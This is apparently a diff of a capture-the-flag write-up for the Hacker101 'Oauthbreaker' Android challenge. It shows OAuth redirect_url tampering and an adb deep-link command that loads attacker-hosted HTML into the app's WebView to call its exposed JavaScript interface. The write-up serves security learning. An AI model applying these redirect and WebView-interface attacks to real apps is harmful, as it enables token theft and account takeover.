@@ -1,18 +1,46 @@
+---
+title: Oauthbreaker
+description: ""
+tags:
+  - burpsuite
+  - webviews
+  - adb
+  - js-interface
+  - HackerOne
+  - android
+keywords:
+  - android reversing
+  - ctf writeup
+  - HackerOne CTF
+  - HackerOne
+  - mobile writeups
+  - apk decompilation
+  - frida tool
+  - mobile security research
+canonical: https://lautarovculic.github.io/writeups/Oauthbreaker/
+---
+
 ![[oauth1.png]]
+
 **Difficulty:** Moderate
+
 **Skills:** Android
+
 **Flags:** 2
 
 ---
 
 ## Flag 1/2
+
 The first thing that we need to do is download the **.APK** file and decompile with **apktool** 
 ```bash
 apktool d oauth.apk
 ```
 
 And for recon, I’ll run **MobSF** and **jadx-gui**
+
 The **target SDK** is **28**, then I will use my **Android 9.0** with _Genymotion_.
+
 Install the **.APK** with
 
 ```bash
@@ -21,6 +49,7 @@ adb install oauth.apk
 ![[oauth2.png]]
 
 When we click on the button, this piece of code is executed:
+
 _NOTE: URL is my private instance._
 
 ```java
@@ -64,8 +93,11 @@ Server: openresty/1.25.3.1
 ```
 
 _For every request, we get a new token_.
+
 And click on the **Authorize Mobile Application**
+
 Then, we are redirect to the App.
+
 ![[oauth3.png]]
 
 Looking at the **Browser.java** source code, in this piece:
@@ -90,6 +122,7 @@ public void onCreate(Bundle bundle) {
 ```
 
 I noticed that there are an endpoint (**/authed**).
+
 Then, I tried change the request of above
 ```bash
 GET /oauth?redirect_url=oauth://final/login&response_type=token&scope=all HTTP/2
@@ -127,9 +160,13 @@ Server: openresty/1.25.3.1
 This is because when we click on **Authorize Mobile Application**, behind scene the “_token flag_” is generated, in the activity without content.
 
 ## Flag 2/2
+
 Looking the source code, I noticed that **WebAppInterface.java** have **getFlagPath()**
+
 Where an **url** is crafted with _some randoms numbers_.
+
 And at _the end_, we can see that **finalize** in **.html**
+
 And looking in the **Browser.java** we can see:
 ```java
 try {
@@ -148,6 +185,7 @@ try {
 ```
 
 Then, we need call the param “**uri**” with **JavaScript** code hosted by our own, calling the **WebApp** know as **iface**.
+
 This code can clarify this:
 ```HTML
 <html>
@@ -183,18 +221,23 @@ adb shell am start -a android.intent.action.VIEW -d "oauth://final/?uri=http://1
 Letme explain the command ^^
 
 **adb shell am start**
+
 This command is used to start an activity on the Android device.
 
 **-a android.intent.action.VIEW**
+
 Specifies the action to be performed, in this case, opening a view.
 
 **-d “oauth://final/?uri=http://192.168.1.4:8081/expl.html”**
+
 This indicates the URI to which the action will be directed. In this case, it looks like you are trying to open a link pointing to “[http://192.168.1.4:8081/expl.html](http://192.168.1.4:8081/expl.html)” with a scheme of “oauth://final/”.
 
 **com.hacker101.oauth**
+
 This is the name of the application package to which this intent will be sent.
 
 So, _executing this command_, we’ll launch the app and a new **.html** file will appear.
+
 ![[oauth4.png]]
 
 Copy, paste and **get the flag**.
